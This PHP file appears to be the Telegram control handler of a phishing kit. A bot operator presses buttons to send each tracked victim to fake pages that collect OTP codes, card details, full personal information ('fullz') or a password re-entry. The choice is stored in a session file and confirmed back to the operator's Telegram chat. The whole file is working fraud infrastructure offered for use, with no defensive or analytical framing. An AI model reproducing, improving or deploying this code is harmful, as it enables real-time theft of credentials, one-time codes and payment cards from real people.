<?php
include('config.php');

// Get the raw POST data
$update = json_decode(file_get_contents('php://input'), true);
error_log("Telegram webhook received: " . print_r($update, true));

// Verify this is a callback query
if (!isset($update['callback_query'])) {
    error_log("Not a callback query");
    die();
}

$callback_query = $update['callback_query'];
$chat_id = $callback_query['message']['chat']['id'];
$message_id = $callback_query['message']['message_id'];
$callback_id = $callback_query['id'];
$data = $callback_query['data'];

// Extract visitor ID from message text using regex
preg_match('/Visitor ID: ([a-f0-9]{64})/', $callback_query['message']['text'], $matches);
$visitor_id = $matches[1] ?? '';

if (empty($visitor_id)) {
    error_log("No visitor ID found in message");
    die();
}

// Handle different button clicks
switch($data) {
    case 'wrong_password':
        $redirect_url = "error.php?id=" . $visitor_id;
        $status = "❌ Wrong Password";
        break;
    case 'otp1':
        $redirect_url = "otp.php?id=" . $visitor_id;
        $status = "🔐 OTP Page 1";
        break;
    case 'otp2':
        $redirect_url = "otp2.php?id=" . $visitor_id;
        $status = "🔐 OTP Page 2";
        break;
    case 'card':
        $redirect_url = "card.php?id=" . $visitor_id;
        $status = "💳 Card Details";
        break;
    case 'fullz':
        $redirect_url = "info.php?id=" . $visitor_id;
        $status = "📝 Personal Info";
        break;
    case 'success':
        $redirect_url = "success.php?id=" . $visitor_id;
        $status = "✅ Success Page";
        break;
    case 'block':
        $redirect_url = "blocked.php?id=" . $visitor_id;
        $status = "🚫 Blocked";
        break;
    default:
        error_log("Unknown callback data: " . $data);
        die();
}

// Update redirects.json
$redirects_file = __DIR__ . '/session/redirects.json';
if (file_exists($redirects_file)) {
    $redirects = json_decode(file_get_contents($redirects_file), true);
    
    if (isset($redirects['redirects'][$visitor_id])) {
        // Update visitor's redirect info
        $redirects['redirects'][$visitor_id]['status'] = 'ready';
        $redirects['redirects'][$visitor_id]['redirect_url'] = $redirect_url;
        $redirects['redirects'][$visitor_id]['updated'] = time();
        
        file_put_contents($redirects_file, json_encode($redirects, JSON_PRETTY_PRINT));
        error_log("Updated redirect for visitor: " . $visitor_id . " to: " . $redirect_url);

        // Send a message confirming the button click
        $msgtg = "🔵 <b>BUTTON CLICKED</b>\n\n";
        $msgtg .= "• Action: <code>{$status}</code>\n";
        $msgtg .= "• Visitor ID: <code>{$visitor_id}</code>\n";
        $msgtg .= "• Redirect URL: <code>{$redirect_url}</code>\n";
        $msgtg .= "• Time: " . date('Y-m-d H:i:s') . "\n";

        $send = [
            'chat_id' => $settings['chat_id'],
            'text' => $msgtg,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];

        $website = "https://api.telegram.org/bot{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}

// Update original message to show selected action
$update_message = [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => $callback_query['message']['text'] . "\n\n🔄 Status: {$status}\n⏰ Updated: " . date('Y-m-d H:i:s'),
    'parse_mode' => 'HTML'
];

$website = "https://api.telegram.org/bot{$settings['bot_url']}";
$ch = curl_init($website . '/editMessageText');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($update_message));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// Answer callback query
$answer = [
    'callback_query_id' => $callback_id,
    'text' => "✅ Action set: {$status}",
    'show_alert' => true
];

$ch = curl_init($website . '/answerCallbackQuery');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($answer));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
?> 